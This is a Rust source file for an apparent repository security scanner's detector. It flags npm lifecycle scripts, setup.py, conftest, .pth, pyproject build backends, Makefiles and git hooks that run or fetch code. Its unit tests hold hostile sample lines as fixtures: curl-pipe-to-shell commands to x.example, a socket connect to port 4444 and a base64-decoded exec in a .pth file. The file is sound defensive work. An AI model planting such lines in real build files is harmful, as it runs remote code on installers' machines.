//! T5: package lifecycle and build scripts — code that runs on `npm install`,
//! `pip install`, interpreter start-up, `pytest`, `make` or `git commit`.

use crate::util::{ExecEntry, added_lines, changed_entries, clip, danger, refs_in, texts};
use regex::Regex;
use serde_json::Value;
use shield_core::{Detector, FileChange, Finding, Severity, Threat};
use std::sync::LazyLock;

/// npm scripts that run on install / pack without being asked for.
const NPM_LIFECYCLE: &[&str] =
    &["preinstall", "install", "postinstall", "prepare", "preprepare", "postprepare", "prepublish", "prepack"];

/// Build backends seen in ordinary projects.
const KNOWN_BACKENDS: &[&str] = &[
    "setuptools.build_meta",
    "setuptools.build_meta:__legacy__",
    "hatchling.build",
    "poetry.core.masonry.api",
    "poetry.masonry.api",
    "flit_core.buildapi",
    "pdm.backend",
    "pdm.pep517.api",
    "maturin",
    "scikit_build_core.build",
    "mesonpy",
    "uv_build",
    "whey",
    "sipbuild.api",
];

/// Python statements that execute programs or fetch code.
static PY_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\b(os\.system|os\.popen|os\.exec\w*|subprocess\.\w+|urllib\.request\.urlopen|urlopen|requests\.(get|post)|socket\.socket|exec|eval|__import__)\s*\(").unwrap()
});
/// The subset that is unusual even at build time.
static PY_STRONG: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\b(os\.system|os\.popen|urlopen|requests\.(get|post)|socket\.socket|exec|eval|__import__)\s*\(")
        .unwrap()
});

#[derive(Clone, Copy, PartialEq)]
enum Kind {
    PackageJson,
    SetupPy,
    Pyproject,
    Pth,
    PyAutoImport,
    Makefile,
    GitHook,
    PreCommit,
}

fn kind(path: &str) -> Option<Kind> {
    let p = path.to_ascii_lowercase();
    if p.split('/').any(|s| s == "node_modules" || s == "site-packages") {
        return None;
    }
    let name = p.rsplit('/').next().unwrap_or(&p);
    Some(match name {
        "package.json" => Kind::PackageJson,
        "setup.py" => Kind::SetupPy,
        "pyproject.toml" => Kind::Pyproject,
        "conftest.py" | "sitecustomize.py" | "usercustomize.py" => Kind::PyAutoImport,
        "makefile" | "gnumakefile" => Kind::Makefile,
        ".pre-commit-config.yaml" => Kind::PreCommit,
        _ if name.ends_with(".pth") => Kind::Pth,
        _ if name.ends_with(".mk") => Kind::Makefile,
        _ if p.starts_with(".husky/") || p.contains("/.husky/") || p.starts_with(".githooks/") => Kind::GitHook,
        _ => return None,
    })
}

pub struct Lifecycle;

impl Detector for Lifecycle {
    fn name(&self) -> &'static str {
        "lifecycle"
    }

    fn interested(&self, c: &FileChange) -> bool {
        c.new.is_some() && kind(&c.path).is_some()
    }

    fn scan_file(&self, c: &FileChange, out: &mut Vec<Finding>) {
        let (Some(k), Some((old, new)), Some(blob)) = (kind(&c.path), texts(c), c.new.as_ref()) else { return };
        let oid = blob.oid.as_str();
        match k {
            Kind::PackageJson => package_json(&old, &new, oid, out),
            Kind::SetupPy => python_module_level(&old, &new, oid, "setup.py runs on `pip install` / build", true, out),
            Kind::PyAutoImport => {
                python_module_level(&old, &new, oid, "pytest / the interpreter imports this automatically", false, out)
            }
            Kind::Pyproject => pyproject(&old, &new, oid, out),
            Kind::Pth => pth(&old, &new, oid, out),
            Kind::Makefile | Kind::GitHook | Kind::PreCommit => shell_like(k, c, &old, &new, oid, out),
        }
    }
}

fn scripts(text: &str) -> Vec<ExecEntry> {
    let Ok(v) = serde_json::from_str::<Value>(text) else { return Vec::new() };
    let Some(Value::Object(m)) = v.get("scripts") else { return Vec::new() };
    m.iter()
        .filter_map(|(k, v)| v.as_str().map(|c| ExecEntry { key: format!("scripts.{k}"), command: c.to_string() }))
        .collect()
}

fn package_json(old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let (o, n) = (scripts(old), scripts(new));
    for e in changed_entries(&o, &n) {
        let name = e.key.trim_start_matches("scripts.");
        let lifecycle = NPM_LIFECYCLE.contains(&name);
        let bad = danger(&e.command);
        let sev = match (bad, lifecycle) {
            (Some(_), _) => Severity::Critical,
            (None, true) => Severity::Medium,
            (None, false) => continue,
        };
        let mut f = Finding::new(
            Threat::T5,
            "t5.npm.script",
            sev,
            if lifecycle {
                format!("npm `{name}` script added or changed (runs on install)")
            } else {
                format!("npm `{name}` script fetches or decodes code")
            },
        )
        .anchor(format!("{oid}:{}", e.key))
        .refs(refs_in(&e.command))
        .detail(format!("command: {}", clip(&e.command, 200)));
        if let Some(b) = bad {
            f = f.detail(b);
        }
        out.push(f);
    }
}

/// New module-level (unindented) statements that run programs or fetch code.
fn python_module_level(old: &str, new: &str, oid: &str, why: &str, setup: bool, out: &mut Vec<Finding>) {
    let added = added_lines(old, new);
    let top: Vec<&str> =
        added.iter().copied().filter(|l| !l.starts_with([' ', '\t']) && !l.trim_start().starts_with('#')).collect();
    let strong: Vec<&str> = top.iter().copied().filter(|l| PY_STRONG.is_match(l)).collect();
    let weak: Vec<&str> = top.iter().copied().filter(|l| PY_EXEC.is_match(l) && !PY_STRONG.is_match(l)).collect();
    if let Some(first) = strong.first() {
        let sev = if strong.iter().any(|l| danger(l).is_some()) { Severity::Critical } else { Severity::High };
        out.push(
            Finding::new(
                Threat::T5,
                "t5.python.exec-on-import",
                sev,
                "Module-level code runs programs or fetches code",
            )
            .anchor(format!("{oid}:{first}"))
            .detail(format!("line: {}", clip(first, 200)))
            .detail(why),
        );
    } else if let Some(first) = weak.first() {
        out.push(
            Finding::new(
                Threat::T5,
                "t5.python.exec-on-import",
                Severity::Medium,
                "Module-level code starts a subprocess",
            )
            .anchor(format!("{oid}:{first}"))
            .detail(format!("line: {}", clip(first, 200)))
            .detail(why),
        );
    }
    if setup && added.iter().any(|l| l.contains("cmdclass")) && !old.contains("cmdclass") {
        out.push(
            Finding::new(
                Threat::T5,
                "t5.python.cmdclass",
                Severity::Medium,
                "setup.py overrides install/build commands",
            )
            .anchor(format!("{oid}:cmdclass"))
            .detail("`cmdclass` replaces setuptools commands with custom code that runs on install."),
        );
    }
}

fn pyproject(old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let get = |t: &str| -> (Option<String>, Option<String>) {
        let Ok(v) = toml::from_str::<toml::Value>(t) else { return (None, None) };
        let bs = v.get("build-system");
        let backend = bs.and_then(|b| b.get("build-backend")).and_then(|x| x.as_str()).map(str::to_string);
        let path = bs.and_then(|b| b.get("backend-path")).map(|x| x.to_string());
        (backend, path)
    };
    let ((ob, op), (nb, np)) = (get(old), get(new));
    if np.is_some() && np != op {
        out.push(
            Finding::new(
                Threat::T5,
                "t5.python.build-backend",
                Severity::Medium,
                "pyproject.toml builds with code from the repo",
            )
            .anchor(format!("{oid}:backend-path"))
            .detail(format!("backend-path = {}", np.unwrap_or_default()))
            .detail("`pip install` imports and runs this in-tree build backend."),
        );
    } else if let Some(b) = nb.filter(|b| Some(b) != ob.as_ref() && !KNOWN_BACKENDS.contains(&b.as_str())) {
        out.push(
            Finding::new(
                Threat::T5,
                "t5.python.build-backend",
                Severity::Medium,
                "pyproject.toml uses an unfamiliar build backend",
            )
            .anchor(format!("{oid}:build-backend"))
            .detail(format!("build-backend = {b}")),
        );
    }
}

fn pth(old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let imports: Vec<&str> =
        added_lines(old, new).into_iter().filter(|l| l.starts_with("import ") || l.starts_with("import\t")).collect();
    let Some(first) = imports.first() else { return };
    let obf = imports.iter().any(|l| {
        let l = l.to_ascii_lowercase();
        l.contains("exec(")
            || l.contains("eval(")
            || l.contains("b64decode")
            || l.contains("__import__")
            || danger(&l).is_some()
    });
    out.push(
        Finding::new(
            Threat::T5,
            "t5.python.pth",
            if obf { Severity::Critical } else { Severity::High },
            "`.pth` file runs code at every Python start-up",
        )
        .anchor(format!("{oid}:pth"))
        .detail(format!("line: {}", clip(first, 200)))
        .detail("Lines starting with `import` in a .pth file on sys.path are executed by every interpreter."),
    );
}

fn shell_like(k: Kind, c: &FileChange, old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let added = added_lines(old, new);
    let bad: Vec<&str> = added.iter().copied().filter(|l| danger(l).is_some()).collect();
    let (rule, what) = match k {
        Kind::Makefile => ("t5.make.command", "Makefile"),
        Kind::GitHook => ("t5.git-hook", "Git hook"),
        _ => ("t5.pre-commit", "pre-commit hook"),
    };
    if let Some(first) = bad.first() {
        out.push(
            Finding::new(Threat::T5, rule, Severity::High, format!("{what} fetches or decodes code to run"))
                .anchor(format!("{oid}:{first}"))
                .refs(refs_in(first))
                .detail(format!("line: {}", clip(first, 200)))
                .detail(danger(first).unwrap_or_default()),
        );
    } else if k == Kind::GitHook && c.old.is_none() {
        out.push(
            Finding::new(
                Threat::T5,
                rule,
                Severity::Medium,
                "Git hook added (runs on commit/push once hooks are installed)",
            )
            .anchor(format!("{oid}:new"))
            .detail(format!("first lines: {}", clip(&new.lines().take(3).collect::<Vec<_>>().join(" ; "), 200))),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil::{added, modified, scan};

    #[test]
    fn npm_scripts() {
        let p = r#"{"scripts":{"postinstall":"node public/fonts/x.ttf","test":"jest"}}"#;
        let f = scan(&Lifecycle, &added("package.json", p.as_bytes()));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].refs, ["public/fonts/x.ttf"]);
        let p = r#"{"scripts":{"prepare":"husky install","build":"tsc"}}"#;
        assert_eq!(scan(&Lifecycle, &added("web/package.json", p.as_bytes()))[0].severity, Severity::Medium);
        assert!(scan(&Lifecycle, &added("node_modules/x/package.json", p.as_bytes())).is_empty());
        let same = r#"{"name":"y","scripts":{"prepare":"husky install","build":"tsc"}}"#;
        assert!(scan(&Lifecycle, &modified("package.json", p.as_bytes(), same.as_bytes())).is_empty());
        let other = r#"{"scripts":{"dev":"curl -s https://x.example/a | sh"}}"#;
        assert_eq!(scan(&Lifecycle, &added("package.json", other.as_bytes()))[0].severity, Severity::Critical);
    }

    #[test]
    fn python() {
        let s =
            "from setuptools import setup\nimport os\nos.system('curl -s https://x.example/a | sh')\nsetup(name='x')\n";
        assert_eq!(scan(&Lifecycle, &added("setup.py", s.as_bytes()))[0].severity, Severity::Critical);
        let s = "import subprocess\nVERSION = subprocess.check_output(['git','describe']).decode()\n";
        assert_eq!(scan(&Lifecycle, &added("setup.py", s.as_bytes()))[0].severity, Severity::Medium);
        let c = "import pytest\n\n@pytest.fixture\ndef x():\n    subprocess.run(['ls'])\n";
        assert!(scan(&Lifecycle, &added("tests/conftest.py", c.as_bytes())).is_empty());
        let c = "import socket\nsocket.socket().connect(('1.2.3.4', 4444))\n";
        assert_eq!(scan(&Lifecycle, &added("conftest.py", c.as_bytes()))[0].severity, Severity::High);
        let pth = "import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n";
        assert_eq!(scan(&Lifecycle, &added("src/x.pth", pth.as_bytes()))[0].severity, Severity::Critical);
        let py = "[build-system]\nrequires=[]\nbuild-backend = \"backend\"\nbackend-path = [\"_build\"]\n";
        assert_eq!(scan(&Lifecycle, &added("pyproject.toml", py.as_bytes()))[0].rule, "t5.python.build-backend");
        let ok = "[build-system]\nbuild-backend = \"hatchling.build\"\n";
        assert!(scan(&Lifecycle, &added("pyproject.toml", ok.as_bytes())).is_empty());
    }

    #[test]
    fn make_and_hooks() {
        let m = "all:\n\tcurl -fsSL https://x.example/i | bash\n";
        assert_eq!(scan(&Lifecycle, &added("Makefile", m.as_bytes()))[0].severity, Severity::High);
        assert!(scan(&Lifecycle, &added("Makefile", b"all:\n\tcargo build\n")).is_empty());
        assert_eq!(scan(&Lifecycle, &added(".husky/pre-commit", b"npx lint-staged\n"))[0].severity, Severity::Medium);
    }
}
